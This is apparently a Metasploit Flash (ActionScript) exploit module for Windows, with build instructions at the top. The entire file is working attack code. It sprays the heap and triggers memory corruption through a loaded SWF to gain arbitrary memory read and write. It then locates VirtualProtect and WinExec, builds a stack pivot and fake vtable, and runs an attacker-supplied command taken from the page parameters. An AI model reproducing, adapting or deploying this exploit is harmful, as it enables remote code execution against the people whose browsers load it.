// Build how to:
// 1. Download the AIRSDK, and use its compiler.
// 2. Download the Flex SDK (4.6)
// 3. Copy the Flex SDK libs (<FLEX_SDK>/framework/libs) to the AIRSDK folder (<AIR_SDK>/framework/libs)
//      (all of them, also, subfolders, specially mx, necessary for the Base64Decoder)
// 4. Build with: mxmlc -o msf.swf Msf.as

// It uses original code from @hdarwin89 for exploitation using ba's and vectors 

package
{
    import flash.utils.*
    import flash.display.*
    import flash.system.*
    import mx.utils.Base64Decoder

	public final class Msf extends Sprite {
		private var interval_id:uint;
		
		private var trigger_swf:String = ""
		
		private var b64:Base64Decoder = new Base64Decoder();
		private var payload:String = ""
		
		private var spray:Vector.<Object> = new Vector.<Object>(89698 + 100)
		private var corrupted_index:uint = 0
		private var restore_required:Boolean = false
		
		private var uv:Vector.<uint>
		private var ba:ByteArray = new ByteArray()
		private var stack:Vector.<uint> = new Vector.<uint>(0x6400)
		private var payload_space:Vector.<uint> = new Vector.<uint>(0x6400)
		
		public function Msf()  {
			b64.decode(LoaderInfo(this.root.loaderInfo).parameters.sh)
			payload = b64.toByteArray().toString();
			trigger_swf = LoaderInfo(this.root.loaderInfo).parameters.tr
			
			ba.endian = "littleEndian"
			ba.length = 1024
			ba.writeUnsignedInt(0xdeedbeef)
			ba.position = 0
			
			var i:uint = 0
			
			while (i < 89698) {
				spray[i] = new Vector.<uint>(1014)
				spray[i][0] = 0xdeadbeef
				spray[i][1] = 0xdeedbeef
				spray[i][2] = i
				spray[i][29] = 0x1a1e1429
				i++
			}
			
			for(i = 0; i < 89698; i = i + 1) {
				spray[i].length = 0x1e
			}

			for(i = 0; i < 100; i = i + 1) {
				spray[i + 89698] = new Vector.<Object>(1014)
				spray[i + 89698][0] = ba
				spray[i + 89698][1] = this
				spray[i + 89698][2] = stack
				spray[i + 89698][3] = payload_space
			}
			
			for(i = 0; i < 100; i = i + 1) {
				spray[i + 89698].length = 114
			}
			
			var trigger_byte_array:ByteArray = createByteArray(trigger_swf)
			trigger_byte_array.endian = Endian.LITTLE_ENDIAN
			trigger_byte_array.position = 0

			// Trigger corruption
			var trigger_loader:Loader = new Loader();
			trigger_loader.loadBytes(trigger_byte_array);
			
			interval_id = setTimeout(exploit, 2000)
        }
        
        public function createByteArray(hex_string:String) : ByteArray {
			var byte:String = null;
			var byte_array:ByteArray = new ByteArray();
			var hex_string_length:uint = hex_string.length;
			var i:uint = 0;
			while(i < hex_string_length)
			{
				byte = hex_string.charAt(i) + hex_string.charAt(i + 1);
				byte_array.writeByte(parseInt(byte,16));
				i = i + 2;
			}
			return byte_array;
		}
		
		public function exploit():void {
			clearTimeout(interval_id)
			
			for(var i:uint = 0; i < spray.length; i = i + 1) {
				if (spray[i].length != 0x1e) {
					corrupted_index = corrupt_vector_uint(i)
					restore_required = true
					uv = spray[corrupted_index]
					uv[0] = 0x1a1e3000 // We're being confident about the spray for exploitation anyway :-)
					control_execution()
					if (restore_required) {
						restore_vector_uint()
					}
					break;
				}
			}
		}
		
		// make it better, search and return error if it doesn't work :-)
		public function corrupt_vector_uint(index:uint):uint {
			spray[index][0x3fe] = 0xffffffff
			return spray[index][0x402]
		}
		
		public function restore_vector_uint():void {
			var atom:uint = spray[corrupted_index][0x3fffffff]
			spray[corrupted_index][0x3ffffbff] = atom
			spray[corrupted_index][0x3ffffbfe] = 0x1e
			// Restore vector corrupted by hand 
			spray[corrupted_index][0x3ffffffe] = 0x1e
		}
		
		public function control_execution():void {
			// Use the corrupted Vector<uint> to search saved addresses
			var object_vector_pos:uint = search_object_vector()
			if (object_vector_pos == 0xffffffff) {
				return
			}
			
			var byte_array_object:uint = uv[object_vector_pos] - 1
			var main:uint = uv[object_vector_pos + 1] - 1
			var stack_object:uint = uv[object_vector_pos + 2] - 1
			var payload_space_object:uint = uv[object_vector_pos + 3] - 1

			// Use the corrupted Vector<uint> to disclose arbitrary memory
			var buffer_object:uint = vector_read(byte_array_object + 0x40)
			var buffer:uint = vector_read(buffer_object + 8)
			var stack_address:uint = vector_read(stack_object + 0x18)
			var payload_address:uint = vector_read(payload_space_object + 0x18)
			var vtable:uint = vector_read(main)
			
			// Set the new ByteArray length
			ba.endian = "littleEndian"
			ba.length = 0x500000
			
			// Overwite the ByteArray data pointer and capacity
			var ba_array:uint = buffer_object + 8
			var ba_capacity:uint = buffer_object + 16
			vector_write(ba_array)
			vector_write(ba_capacity, 0xffffffff)
			
			// restoring the corrupted vector length since we don't need it anymore
			restore_vector_uint()
			restore_required = false
			
			var flash:uint = base(vtable)
			var winmm:uint = module("winmm.dll", flash)
			var kernel32:uint = module("kernel32.dll", winmm)
			var virtualprotect:uint = procedure("VirtualProtect", kernel32)
			var winexec:uint = procedure("WinExec", kernel32)
			var xchgeaxespret:uint = gadget("c394", 0x0000ffff, flash)
			var xchgeaxesiret:uint = gadget("c396", 0x0000ffff, flash)

			// Continuation of execution
			byte_write(buffer + 0x10, "\xb8", false); byte_write(0, vtable, false) // mov eax, vtable
			byte_write(0, "\xbb", false); byte_write(0, main, false) // mov ebx, main
			byte_write(0, "\x89\x03", false) // mov [ebx], eax
			byte_write(0, "\x87\xf4\xc3", false) // xchg esp, esi # ret

			// Put the payload (command) in memory
			byte_write(payload_address + 8, payload, true); // payload

			// Put the fake vtabe / stack on memory
			byte_write(stack_address + 0x18070, xchgeaxespret) // Initial gadget (stackpivot); from @hdarwin89 sploits, kept for reliability...
			byte_write(stack_address + 0x180a4, xchgeaxespret) // Initial gadget (stackpivot); call    dword ptr [eax+0A4h]
			byte_write(stack_address + 0x18000, xchgeaxesiret) // fake vtable; also address will become stack after stackpivot
			byte_write(0, virtualprotect)

			// VirtualProtect
			byte_write(0, winexec)
			byte_write(0, buffer + 0x10)
			byte_write(0, 0x1000)
			byte_write(0, 0x40)
			byte_write(0, buffer + 0x8) // Writable address (4 bytes)

			// WinExec
			byte_write(0, buffer + 0x10)
			byte_write(0, payload_address + 8)
			byte_write(0)

			byte_write(main, stack_address + 0x18000) // overwrite with fake vtable
						
			toString() // call method in the fake vtable
		}
		
		private function search_object_vector():uint {
			var i:uint = 0;
			while (i < 89698 * 1024){
				if (uv[i] == 114) {
					return i + 1;
				}
				i++
			}
			return 0xffffffff
		}
		
		// Methods to use the corrupted uint vector
		
		private function vector_write(addr:uint, value:uint = 0):void
		{
			var pos:uint = 0

			if (addr > uv[0]) {
				pos = ((addr - uv[0]) / 4) - 2
			} else {
				pos = ((0xffffffff - (uv[0] - addr)) / 4) - 1
			}

			uv[pos] = value
		}

		private function vector_read(addr:uint):uint
		{
			var pos:uint = 0

			if (addr > uv[0]) {
				pos = ((addr - uv[0]) / 4) - 2
			} else {
				pos = ((0xffffffff - (uv[0] - addr)) / 4) - 1
			}

			return uv[pos]
		}
		
		// Methods to use the corrupted byte array for arbitrary reading/writing

		private function byte_write(addr:uint, value:* = 0, zero:Boolean = true):void
		{
			if (addr) ba.position = addr
			if (value is String) {
				for (var i:uint; i < value.length; i++) ba.writeByte(value.charCodeAt(i))
				if (zero) ba.writeByte(0)
			} else ba.writeUnsignedInt(value)
		}

		private function byte_read(addr:uint, type:String = "dword"):uint
		{
			ba.position = addr
			switch(type) {
				case "dword":
					return ba.readUnsignedInt()
				case "word":
					return ba.readUnsignedShort()
				case "byte":
					return ba.readUnsignedByte()
			}
			return 0
		}

		// Methods to search the memory with the corrupted byte array

		private function base(addr:uint):uint
		{
			addr &= 0xffff0000
			while (true) {
				if (byte_read(addr) == 0x00905a4d) return addr
				addr -= 0x10000
			}
			return 0
		}

		private function module(name:String, addr:uint):uint
		{
			var iat:uint = addr + byte_read(addr + byte_read(addr + 0x3c) + 0x80) 
			var i:int = -1
			while (true) {
				var entry:uint = byte_read(iat + (++i) * 0x14 + 12)
				if (!entry) throw new Error("FAIL!");
				ba.position = addr + entry
				var dll_name:String = ba.readUTFBytes(name.length).toUpperCase();
				if (dll_name == name.toUpperCase()) {
					break;
				}
			}
			return base(byte_read(addr + byte_read(iat + i * 0x14 + 16)));
		}

		private function procedure(name:String, addr:uint):uint
		{
			var eat:uint = addr + byte_read(addr + byte_read(addr + 0x3c) + 0x78)
			var numberOfNames:uint = byte_read(eat + 0x18)
			var addressOfFunctions:uint = addr + byte_read(eat + 0x1c)
			var addressOfNames:uint = addr + byte_read(eat + 0x20)
			var addressOfNameOrdinals:uint = addr + byte_read(eat + 0x24)

			for (var i:uint = 0; ; i++) {
				var entry:uint = byte_read(addressOfNames + i * 4)
				ba.position = addr + entry
				if (ba.readUTFBytes(name.length+2).toUpperCase() == name.toUpperCase()) break
			}
			return addr + byte_read(addressOfFunctions + byte_read(addressOfNameOrdinals + i * 2, "word") * 4)
		}

		private function gadget(gadget:String, hint:uint, addr:uint):uint
		{
			var find:uint = 0
			var limit:uint = byte_read(addr + byte_read(addr + 0x3c) + 0x50)
			var value:uint = parseInt(gadget, 16)
			for (var i:uint = 0; i < limit - 4; i++) if (value == (byte_read(addr + i) & hint)) break
			return addr + i
		}
	}
}